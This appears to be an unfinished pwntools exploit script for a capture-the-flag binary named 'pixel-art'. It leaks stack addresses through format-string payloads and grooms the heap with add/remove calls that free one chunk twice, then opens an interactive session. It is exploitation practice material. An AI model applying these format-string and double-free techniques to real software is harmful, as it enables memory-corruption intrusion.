#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('pixel-art')

pwn.context(terminal=['tmux', 'new-window'])
pwn.context.log_level = 'DEBUG'

pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
b *0x5555555552ce
b *0x55555555536a
b *0x5555555557ac
b *0x55555555566d
b *0x55555555568a
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def GetOffsetStdin():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process(exe.path)
    p.sendline(pwn.cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def GetOffsetArgv():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process([exe.path, cyclic(512)])
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def addPixal(row, column, patternlen, pattern):
    io.recvuntil("Exit\n")
    io.sendline("1")
    io.recvuntil("row>")
    io.sendline(row)
    io.recvuntil("column>")
    io.sendline(column)
    io.recvuntil("pattern length>")
    io.sendline(patternlen)
    io.recvuntil("pattern>")
    io.sendline(pattern)


def removePixal(row, column):
    io.recvuntil("Exit\n")
    io.sendline("2")
    io.recvuntil("row>")
    io.sendline(row)
    io.recvuntil("column>")
    io.sendline(column)

def show():
    io.recvuntil("Exit\n")
    io.sendline("4")

io.recvuntil(":")
io.sendline("50")
io.recvuntil(":")
io.sendline("50")

addPixal("0", "0", "5", b"%25$p")
addPixal("0", "1", "5", b"%17$p")
show()

addPixal("1", "1", "1", "A")
addPixal("2", "1", "1", "A")
addPixal("3", "1", "1", "A")
addPixal("4", "1", "1", "A")
addPixal("5", "1", "1", "A")
addPixal("6", "1", "1", "A")
addPixal("7", "1", "1", "A")
addPixal("8", "1", "1", "A")
addPixal("9", "1", "1", "A")
addPixal("10", "1", "1", "A")
addPixal("11", "1", "1", "A")
removePixal("1", "1")
removePixal("2", "1")
removePixal("3", "1")
removePixal("4", "1")
removePixal("5", "1")
removePixal("6", "1")
removePixal("7", "1")
removePixal("8", "1")
removePixal("9", "1")
removePixal("8", "1")


addPixal("1", "1", "1", "A")
addPixal("2", "1", "1", "A")
addPixal("3", "1", "1", "A")
addPixal("4", "1", "1", "A")
addPixal("5", "1", "1", "A")

#addPixal("6", "1", "1", "A")
#addPixal("7", "1", "1", "A")


io.interactive()
